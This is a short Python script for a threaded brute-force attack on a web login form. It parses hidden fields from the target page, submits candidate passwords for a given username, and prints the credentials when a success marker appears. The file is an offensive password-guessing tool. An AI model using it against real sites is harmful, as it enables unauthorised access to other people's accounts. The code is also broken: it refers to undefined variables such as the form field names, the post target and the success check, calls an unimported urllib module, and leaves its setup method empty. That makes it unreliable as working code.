#!/usr/bin/env python

import config, threading
from http import cookiejar
import urllib.request as urllib2
import bruteparser

class Bruter(object):
	def __init__(self, username, words):
		
		self.username = username
		self.password_q = words
		self.found = False

		print(" | Finished up settings up for user: %s" % username)

	def bootstrap_bruter(self):
		
		# Load the page for the first time and look
		# for hidden fields.
		return

	def run_bruteforce(self):

		for i in range(config.user_thread): 
			t = threading.Thread(target=self.web_bruter) 
			t.start() 

	def web_bruter(self):

		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			jar = cookiejar.FileCookieJar("cookies") 
			opener = urllib2. build_opener(urllib2.HTTPCookieProcessor(jar))

			response = opener.open(config.target_url) 

			page = response.read() 
			print("Trying: %s : %s (%d left)" % (self.username, brute, self. password_q.qsize()))

			# parse out the hidden fields
			parser = bruteparser.BruteParser()
			parser.feed(page)
			post_tags = parser.tag_results

			# add our username and password fields
			post_tags[username_field] = self.username
			post_tags[password_field] = brute
			login_data = urllib.urlencode(post_tags)
			login_response = opener.open( target_post, login_data)
			login_result = login_response.read()

			if success_check in login_result: 
				self.found = True
				print("[*] Bruteforce successful.")
				print("[*] Username: %s" % username)
				print("[*] Password: %s" % brute)
				print("[*] Waiting for other threads to exit...")	